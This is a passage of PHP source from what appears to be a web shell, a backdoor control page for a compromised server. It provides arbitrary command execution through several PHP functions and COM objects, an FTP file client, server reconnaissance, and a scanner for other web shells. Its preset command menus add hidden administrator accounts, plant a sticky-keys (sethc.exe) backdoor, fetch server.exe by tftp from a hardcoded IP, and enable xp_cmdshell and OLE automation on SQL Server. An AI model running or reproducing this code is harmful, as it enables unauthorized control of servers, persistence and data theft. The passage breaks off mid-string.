	$features_asx = array('绝对路径'=>'绝对路径','输入马的内容'=>'输入马的内容','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<%eval request','execute session()'=>'execute session(','--Created!'=>'--Created!','WScript.Shell'=>'WScript.Shell','<%s LANGUAGE = VBScript.Encode %>'=>'<%@ LANGUAGE = VBScript.Encode %>','www.rootkit.net.cn'=>'www.rootkit.net.cn','Process.GetProcesses'=>'Process.GetProcesses','lake2'=>'lake2');
print<<<END
<div class="actall" style="height:100px;"><form method="POST" name="tform" id="tform" action="?s=e">
Path: <input type="text" name="sp" id="sp" value="{$SCAN_DIR}" style="width:400px;">
<select name="st">
<option value="php">phpshell</option>
<option value="asx">aspshell+aspxshell</option>
<option value="ppp">phpshell+aspshell+aspxshell</option>
</select>
<input class="bt" type="submit" value="Scan">
</form><br>
END;
	if(!empty($_POST['sp']))
	{
		if($_POST['st'] == 'php'){$features_all = $features_php; $st = '\.php|\.inc|\.php4|\.php3|\._hp|\;';}
		if($_POST['st'] == 'asx'){$features_all = $features_asx; $st = '\.asp|\.asa|\.cer|\.aspx|\.ascx|\.cdx|\;';}
		if($_POST['st'] == 'ppp'){$features_all = array_merge($features_php,$features_asx); $st = '\.php|\.inc|\.php4|\.php3|\._hp|\.asp|\.asa|\.cer|\.cdx|\.aspx|\.ascx|\;';}
		echo Antivirus_Auto($_POST['sp'],$features_all,$st) ? 'Done' : 'Abort';
	}
	echo '</div>';
	return true;
}
//search file
function Findfile_Auto($sfp,$sfc,$sft,$sff,$sfb)
{
	//echo $sfp.'<br>'.$sfc.'<br>'.$sft.'<br>'.$sff.'<br>'.$sfb;
	if(($h_d = @opendir($sfp)) == NULL) return false;
	while(false !== ($Filename = @readdir($h_d)))
	{
		if($Filename == '.' || $Filename == '..') continue;
		if(eregi($sft,$Filename)) continue;
		$Filepath = File_Str($sfp.'/'.$Filename);
		if(is_dir($Filepath) && $sfb) Findfile_Auto($Filepath,$sfc,$sft,$sff,$sfb);
		if($sff)
		{
			if(stristr($Filename,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
		else
		{
			$File_code = File_Read($Filepath);
			if(stristr($File_code,$sfc))
			{
				echo '<a target="_blank" href="?s=p&fp='.urlencode($sfp).'&fn='.urlencode($Filename).'"> '.$Filepath.' </a><br>'."\r\n";
				ob_flush();
				flush();
			}
		}
	}
	@closedir($h_d);
	return true;
}

function Findfile_j()
{
	if(!empty($_GET['df'])){echo $_GET['df'];if(@unlink($_GET['df'])){echo '<font style=font:11pt color=ff0000>del successfully</font>';}else{@chmod($_GET['df'],0666);echo @unlink($_GET['df']) ? '<font style=font:11pt color=ff0000>del successfully</font>' : '<font style=font:11pt color=ff0000>del faild</font>';} return false;}
	if((!empty($_GET['fp'])) && (!empty($_GET['fn'])) && (!empty($_GET['dim']))) { File_Edit($_GET['fp'],$_GET['fn'],$_GET['dim']); return false; }
	$SCAN_DIR = isset($_POST['sfp']) ? $_POST['sfp'] : File_Mode();
	$SCAN_CODE = isset($_POST['sfc']) ? $_POST['sfc'] : 'config';
	$SCAN_TYPE = isset($_POST['sft']) ? $_POST['sft'] : '.mp3|.mp4|.avi|.swf|.jpg|.gif|.png|.bmp|.gho|.rar|.exe|.zip';
print<<<END
<form method="POST" name="jform" id="jform" action="?s=u">
<div class="actall">Scan Path <input type="text" name="sfp" value="{$SCAN_DIR}" style="width:600px;"></div>
<div class="actall">&nbspFile Filter&nbsp <input type="text" name="sft" value="{$SCAN_TYPE}" style="width:600px;"></div>
<div class="actall">Keywords <input type="text" name="sfc" value="{$SCAN_CODE}" style="width:395px;">
<input type="radio" name="sff" value="a" checked>search filename 
<input type="radio" name="sff" value="b">search include keywords</div>
<div class="actall" style="height:50px;"><input type="radio" name="sfb" value="a" checked>applied to current folder,subfolders and files
<br><input type="radio" name="sfb" value="b">only applied to current folder</div>
<div class="actall"><input class="bt" type="submit" value="scan" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['sfp'])) && (!empty($_POST['sfc'])))
	{
		echo '<div class="actall">';
		$_POST['sft'] = str_replace('.','\\.',$_POST['sft']);
		$sff = ($_POST['sff'] == 'a') ? true : false;
		$sfb = ($_POST['sfb'] == 'a') ? true : false;
		echo Findfile_Auto($_POST['sfp'],$_POST['sfc'],$_POST['sft'],$sff,$sfb) ? '<font style=font:11pt color=ff0000>Done</font>' : '<font style=font:11pt color=ff0000>Error</font>';
		echo '</div>';
	}
	return true;
}
//ftp connect
function filecollect($dir,$filelist) {
   $files = ftp_nlist($conn,$dir); 
   return $files;
   }
function ftp_php(){
$dir = "";
$ftphost = isset($_POST['ftphost']) ? $_POST['ftphost'] : '127.0.0.1';
$ftpuser = isset($_POST['ftpuser']) ? $_POST['ftpuser'] : 'root';
$ftppass = isset($_POST['ftppass']) ? $_POST['ftppass'] : 'root';
$ftplist = isset($_POST['list']) ? $_POST['list'] : '';
$ftpfolder = isset($_POST['ftpfolder']) ? $_POST['ftpfolder'] : '/';
$ftpfolder = strtr($ftpfolder,"\\","/");
$files = isset($_POST['readfile']) ? $_POST['readfile'] : '';
print<<<END
<br><br><div class="actall"><h5>connect ftp server with php</h5><br></div>
<form method="POST" name="" action=""><br>
<div class="actall">Host:<input type="text" name="ftphost" value="{$ftphost}" style="width:100px">
User:<input type="text" name="ftpuser" value="{$ftpuser}" style="width:100px">
Pass:<input type="text" name="ftppass" value="{$ftppass}" style="width:100px"><br><br>
<input type="hidden" name="readfile" value="" style="width:200px">
folder:<input type="text" name="ftpfolder" value="{$ftpfolder}" style="width:200px">
<input type="hidden" name="list" value="list">
<input class="bt" type="submit" name="list" value="list" style="width:40px"><br><br></form></div>
END;
if($ftplist == 'list'){
$conn = @ftp_connect($ftphost) or die("could not connect to ftp server");
    if(@ftp_login($conn,$ftpuser,$ftppass)){
    $filelists = @ftp_nlist( $conn, $ftpfolder );
    echo "<pre>";
    echo "current folder is <font color='#FF0000'>$ftpfolder</font>:<br>";
    if(is_array($filelists))
    {
    foreach ($filelists as $file)
    {
       $file = strtr($file,"\\","/");
       $size_file =@ftp_size($conn, $file);
       if ( $size_file == -1)
           {
           $a=$a.basename($file)."<br>";
           }
       else
           {
           $b=$b.basename($file)."				".$size_file."B</br>";
           }
    }
    }
    echo $a;
    echo $b;
    echo "</pre>";
    }
    }
print<<<END
<form method="POST" name="" action="" >
<div class="actall">filename:<input type="text" name="readfile" value="{$files}" style="width:200px">
<input type="hidden" name="read" value="read">
<input class="bt" type="submit" name="read" value="read" style="width:40px"><br><br></form></div>
END;
$readaction = isset($_POST['read']) ? $_POST['read'] : '';
if ($readaction == 'read') {
    $handle = @file_get_contents("ftp://$ftpuser:$ftppass@$ftphost/$files", "r");
    $handle = htmlspecialchars($handle);
    $handle = str_replace("\n", "<br>", $handle);
    echo "the content of <font color='#FF0000'>$files</font> is:<br><br>";
    echo $handle;
    }
print<<<END
<form method="post" enctype="multipart/form-data" name="" action="">
<div class="actall">folder:<input type="text" name="cdir" value="{$cdir}" style="width:100px">
<input type="file" name="upload" value="upload" style="width:200px;height:22px;">
<input type="hidden" name="upfile" value="upfile">
<input class="bt" type="submit" name="submit" value="upfile" style="width:40px"><br><br></form></div>
END;
$upaction = isset($_POST['upfile']) ? $_POST['upfile'] : '' ;    
if ($upaction == 'upfile') {
    $cdir = isset($_POST['cdir']) ? $_POST['cdir'] : '/';
    $conn = @ftp_connect($ftphost) or die("could not connect to ftp server");
    if(@ftp_login($conn,$ftpuser,$ftppass)){
        @ftp_chdir($conn, $cdir);
        $res_code = @ftp_put($conn,$_FILES['upload']['name'],$_FILES['upload']['tmp_name'], FTP_BINARY,0);
        if (empty($res_code)){
            echo '<font color="#FF67A0">ftp upload faild</font><br>';
            }
         else{
             echo '<font color="#FF67A0">ftp upload successful</font><br>';
             } 
        }
    }
print<<<END
<form method="POST" enctype="multipart/form-data" name="" action="">
<div class="actall">path:<input type="text" name="downfile" value="{$getfile}" style="width:100px">
<input type="hidden" name="getfile" value="down">
<input class="bt" type="submit" name="down" value="down" style="width:40px"><br><br></form></div>
END;
$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : '';
$getaction = isset($_POST['getfile']) ? $_POST['getfile'] : '';   
if ($getaction == 'down' && $getfile !=''){
function php_ftp_download($filename){   
global $ftphost,$ftpuser,$ftppass;              
  $ftp_path = dirname($filename)   .   "/";         
  $select_file = basename($filename);        
  $ftp = @ftp_connect($ftphost);        
  if($ftp){   
        if(@ftp_login($ftp, $ftpuser, $ftppass)){        
        if(@ftp_chdir($ftp,$ftp_path))   {                              
        $tmpfile = tempnam(getcwd(),"temp");
        if(ftp_get($ftp,$tmpfile,$select_file,FTP_BINARY)){       
          ftp_quit($ftp);      
          header("Content-Type:application/octet-stream");   
          header("Content-Disposition:attachment;  filename=" . $select_file);   
          unlink($tmpfile); 
          exit;   
          }   
         }   
          }   
      }   
      ftp_quit($ftp);   
  }
php_ftp_download($getfile); 
}
}
//server info

function Info_Cfg($varname){switch($result = get_cfg_var($varname)){case 0: return "No"; break; case 1: return "Yes"; break; default: return $result; break;}}
function Info_Fun($funName){return (false !== function_exists($funName)) ? "Yes" : "No";}
function Info_f()
{
	$dis_func = get_cfg_var("disable_functions");
	$upsize = get_cfg_var("file_uploads") ? get_cfg_var("upload_max_filesize") : "upfile forbidden";
	$adminmail = (isset($_SERVER['SERVER_ADMIN'])) ? "<a href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" : "<a href=\"mailto:".get_cfg_var("sendmail_from")."\">".get_cfg_var("sendmail_from")."</a>";
	if($dis_func == ""){$dis_func = "No";}else{$dis_func = str_replace(" ","<br>",$dis_func);$dis_func = str_replace(",","<br>",$dis_func);}
	$phpinfo = (!eregi("phpinfo",$dis_func)) ? "Yes" : "No";
	$info = array(
		array("server time",date("Y-m-d h:i:s",time())),
		array("server domain","<a href=\"http://".$_SERVER['SERVER_NAME']."\" target=\"_blank\">".$_SERVER['SERVER_NAME']."</a>"),
		array("server ip",gethostbyname($_SERVER['SERVER_NAME'])),
		array("server os",PHP_OS),
		array("server os language",$_SERVER['HTTP_ACCEPT_LANGUAGE']),
		array("server powerby",$_SERVER['SERVER_SOFTWARE']),
		array("your IP",getenv('REMOTE_ADDR')),
		array("server port",$_SERVER['SERVER_PORT']),
		array("php run mode",strtoupper(php_sapi_name())),
		array("php ver",PHP_VERSION),
		array("run in safe mode",Info_Cfg("safemode")),
		array("server administrator",$adminmail),
		array("current file path",__FILE__),
		array("allow_url_fopen",Info_Cfg("allow_url_fopen")),
		array("enable load dll",Info_Cfg("enable_dl")),
		array("display_errors",Info_Cfg("display_errors")),
		array("register_globals",Info_Cfg("register_globals")),
		array("magic_quotes_gpc",Info_Cfg("magic_quotes_gpc")),
		array("memory_limit",Info_Cfg("memory_limit")),
		array("post_max_size",Info_Cfg("post_max_size")),
		array("upload_max_filesize",$upsize),
		array("max_execution_time",Info_Cfg("max_execution_time")."second"),
		array("disable_functions",$dis_func),
		array("phpinfo()",$phpinfo),
		array("free disk space",intval(diskfreespace(".") / (1024 * 1024)).'Mb'),
		array("GD Library",Info_Fun("imageline")),
		array("IMAP",Info_Fun("imap_close")),
		array("Mysql database",Info_Fun("mysql_close")),
		array("SyBase database",Info_Fun("sybase_close")),
		array("Oracle database",Info_Fun("ora_close")),
		array("Oracle 8 database",Info_Fun("OCILogOff")),
		array("PREL PCRE",Info_Fun("preg_match")),
		array("support PDF",Info_Fun("pdf_close")),
		array("Postgresql database",Info_Fun("pg_close")),
		array("SNMP",Info_Fun("snmpget")),
		array("Zlib",Info_Fun("gzclose")),
		array("parse XML",Info_Fun("xml_set_object")),
		array("FTP",Info_Fun("ftp_login")),
		array("ODBC",Info_Fun("odbc_close")),
		array("support Session",Info_Fun("session_start")),
		array("support Socket",Info_Fun("fsockopen")),
	);
	echo '<table width="100%" border="0">';
	for($i = 0;$i < count($info);$i++){echo '<tr><td width="40%">'.$info[$i][0].'</td><td>'.$info[$i][1].'</td></tr>'."\n";}
	echo '</table>';
	return true;
}

//execute command with php function
function Exec_Run($cmd)
{ 
        $res = '';
	if(function_exists('exec')){@exec($cmd,$res);$res = join("\n",$res);}
	elseif(function_exists('shell_exec')){$res = @shell_exec($cmd);}
	elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}
	elseif(@is_resource($f = @popen($cmd,"r"))){$res = '';while(!@feof($f)){$res .= @fread($f,1024);}@pclose($f);}
	return $res;
}


function Exec_g()
{       
        echo '<br>';
	$res = 'back screen';
	$cmd = 'dir';
	if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}
print<<<END
<script language="javascript">
function sFull(i){
	Str = new Array(11);
	Str[0] = "ver";
        Str[1] = "path";
        Str[2] = "ipconfig /all";
        Str[3] = "whoami";
        Str[4] = "tasklist /svc";
        Str[5] = "netstat -an";
        Str[6] = "systeminfo";
	Str[7] = "net user";
        Str[8] = "net view";
        Str[9] = "net config workstation";
        Str[10] = "net config server";
	Str[11] = "net user b4che10r b4che10r /add & net localgroup administrators b4che10r /add";
	Str[12] = "query user";
	Str[13] = "copy c:\\1.php d:\\2.php";
        Str[14] = "copy c:\\windows\\explorer.exe c:\\windows\\system32\\sethc.exe & copy c:\\windows\\system32\\sethc.exe c:\\windows\\system32\\dllcache\\sethc.exe";
	Str[15] = "tftp -i 219.134.46.245 get server.exe c:\\\\server.exe";
        Str[16] = "ps -ef";
        Str[17] = "ifconfig";
        Str[18] = "cat /etc/syslog.conf";
        Str[19] = "cat /etc/my.cnf";
        Str[20] = "cat /etc/hosts";
        Str[21] = "cat /etc/services";
	document.getElementById('cmd').value = Str[i];
	return true;
}
</script>
<div class="actall"><form method="POST" name="gform" id="gform" action="?s=g">
Command: <input type="text" name="cmd" id="cmd" value="{$cmd}" style="width:369px;">
<select onchange='return sFull(options[selectedIndex].value)'>
<option value="0" selected>----Command Collection----</option>
<option value="1">path(win)</option>
<option value="2">ipconfig(win)</option>
<option value="3">whoami(win)</option>
<option value="4">tasklist(win)</option>
<option value="5">port view</option>
<option value="6">systeminfo(win)</option>
<option value="7">net user(win)</option>
<option value="8">net view(win)</option>
<option value="9">net config workstation(win)</option>
<option value="10">net config server(win)</option>
<option value="11">add administrators(win)</option>
<option value="12">query user(win)</option>
<option value="13">copy file(win)</option>
<option value="14">shift backdoor(win)</option>
<option value="15">FTP download(win)</option>
<option value="16">ps(linux)</option>
<option value="17">ifconfig(linux)</option>
<option value="18">syslog.conf(linux)</option>
<option value="19">my.cnf(linux)</option>
<option value="20">hosts(linux)</option>
<option value="21">services(linux)</option>

</select>
<input class="bt" type="submit" value="execute" ></div>
<div class="actall"><textarea name="show" style="width:720px;height:450px;">{$res}</textarea></div>
</form>
END;
	return true;
}

//api

function Com_h()
{
	$object = isset($_GET['o']) ? $_GET['o'] : 'adodb';
	$com = array("adodb" => "ADODB.Connection","wscript" => "WScript.shell","application" => "Shell.Application");
print<<<END
<div class="actall"><a href="?s=h&o=adodb">[ADODB.Connection]</a> 
<a href="?s=h&o=wscript">[WScript.shell]</a> 
<a href="?s=h&o=application">[Shell.Application]</a></div>
<div class="actall" style="height:200px;">
<form method="POST" name="hform" id="hform" action="?s=h&o={$object}"><br>
END;
	$shell = new COM($com[$object]);
if($object == 'wscript')
{
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'dir';
        $cmdpath = isset($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\windows\\system32\\cmd.exe';
print<<<END
&nbspcmdpath:<input type="text" name="cmdpath" value="{$cmdpath}" style="width:600px;"><br>
command:<input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<input class="bt" type="submit" value="execute"></form><br>
END;
	if(!empty($_POST['cmd']))
	{
                
		$exe = @$shell->exec("$cmdpath /c ".$cmd);
		$out = $exe->StdOut();
		$output = $out->ReadAll();
		echo '<pre>'.$output.'</pre>';
	}
}
elseif($object == 'application')
{
	$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';
	$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\windows\php.ini c:\php.ini';
print<<<END
Path:<br><input type="text" name="run" value="{$run}" style="width:600px;">
<br><br>Command argv:<br><input type="text" name="cmd" value="{$cmd}" style="width:600px;">
<br><br><input class="bt" type="submit" value="execute"></form><br>
END;
	if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'Done' : 'Faild';
}
elseif($object == 'adodb')
{
	$string = isset($_POST['string']) ? $_POST['string'] : '';
	$sql = isset($_POST['sql']) ? $_POST['sql'] : '';
print<<<END
<script language="javascript">
function hFull(i){
	if(i==0 || i==10) return false;
	Str = new Array(12);  
	Str[1] = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\db.mdb;Jet OLEDB:Database Password=***";
	Str[2] = "Driver={Sql Server};Server=localhost,1433;Database=DbName;Uid=sa;Pwd=sa";
	Str[3] = "Driver={MySql};Server=localhost;Port=3306;Database=DbName;Uid=root;Pwd=root";
	Str[4] = "Provider=OraOLEDB.Oracle.1;User ID=oracle;Password=oracle;Data Source=ORACLE;Persist Security Info=True;";
        Str[5] = "driver={IBM db2 odbc DRIVER};database=mydb;hostname=localhost;port=50000;protocol=TCPIP;uid=root; pwd=pass";
        Str[6] = "DRIVER={POSTGRESQL};SERVER=127.0.0.1;DATABASE=PostGreSQL;UID=postgresql;PWD=123456;";
        Str[7] = "Dsn='';Driver={INFORMIX 3.30 32 BIT};Host=myHostname;Server=myServerName;Service=myServiceName;Protocol=olsoctcp;Database=myDbName;UID=myUsername;PWD=myPassword";
	Str[8] = "DSN=mydns;Uid=username;Pwd=password";
        Str[9] = "FILEDNS=c:\\\path\\\db.dsn;Uid=username;Pwd=password";
        Str[11] = "SELECT * FROM [TableName] WHERE ID<100";
	Str[12] = "INSERT INTO [TableName](USER,PASS) VALUES('b4che10r','mypass')";
	Str[13] = "UPDATE [TableName] SET USER='b4che10r' WHERE ID=100";
	Str[14] = "CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))";
	Str[15] = "DROP TABLE [TableName]";
	Str[16] = "ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)";
        Str[17] = "select shell('c:\windows\system32\cmd.exe /c net user b4che10r abc123 /add');";
        Str[18] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
        Str[19] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;";
        Str[20] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
        Str[21] = "Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')";
        Str[22] = "Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll')";
        Str[23] = "Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?php phpinfo();?><?php\n\n{$phpcode}\n\n?>